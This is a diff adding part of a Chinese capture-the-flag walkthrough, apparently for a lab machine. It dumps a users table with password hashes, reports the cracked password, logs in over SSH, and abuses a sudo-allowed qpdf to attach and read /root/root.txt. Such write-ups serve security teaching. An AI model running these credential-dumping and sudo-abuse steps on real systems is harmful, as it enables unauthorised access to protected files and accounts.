@@ -113,3 +113,52 @@ Serving HTTP on 0.0.0.0 port 959 (http://0.0.0.0:959/) ...
 
 连接数据库,在user表下发现账号以及口令的hash值.
 
+```
+select * from users;
++----+----------+------------------------------------------------------------------+----------------------------------+
+| id | username | password                                                         | role_id                          |
++----+----------+------------------------------------------------------------------+----------------------------------+
+|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
+|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
++----+----------+------------------------------------------------------------------+----------------------------------+
+```
+
+爆破得出结果, 密码是 simple and clean
+
+<figure><img src="../.gitbook/assets/3018cd77605f4215a32ef3b030ea3b7.png" alt=""><figcaption></figcaption></figure>
+
+ssh 登录,获得user flag.
+
+<figure><img src="../.gitbook/assets/665323368e4946e5b19a4929230adc8.png" alt=""><figcaption></figcaption></figure>
+
+### 2.3 sudo提权
+
+sudo -l 查看具有root权限的指令.
+
+<figure><img src="../.gitbook/assets/da89770f5e2ae6a35555b34f6f475b0.png" alt=""><figcaption></figcaption></figure>
+
+有一个qpdf程序有root权限,去google一下这个指令.
+
+存在以下选项,可以向一个文件中添加附件.
+
+<figure><img src="../.gitbook/assets/0ef87c4bf94c4c1850455af7783470a.png" alt=""><figcaption></figcaption></figure>
+
+```
+sudo /usr/bin/qpdf --empty ./root.txt --add-attachment /root/root.txt --
+```
+
+<figure><img src="../.gitbook/assets/978937122f00994d9d0ab5d9095b71f.png" alt=""><figcaption></figcaption></figure>
+
+发现其中root.txt的部分出现了乱码.
+
+再度查看qpdf的文档,发现存在qdf指令,可以使pdf可用text进行查看.
+
+<figure><img src="../.gitbook/assets/5e57302ba3ad4d49b2f7333bb0b81d5.png" alt=""><figcaption></figcaption></figure>
+
+```
+sudo /usr/bin/qpdf --qdf --empty ./root.txt --add-attachment /root/root.txt  --
+```
+
+成功获取root flag.
+
+<figure><img src="../.gitbook/assets/d6534a98f4e0b5154c3cb0b223947ea.png" alt=""><figcaption></figcaption></figure>
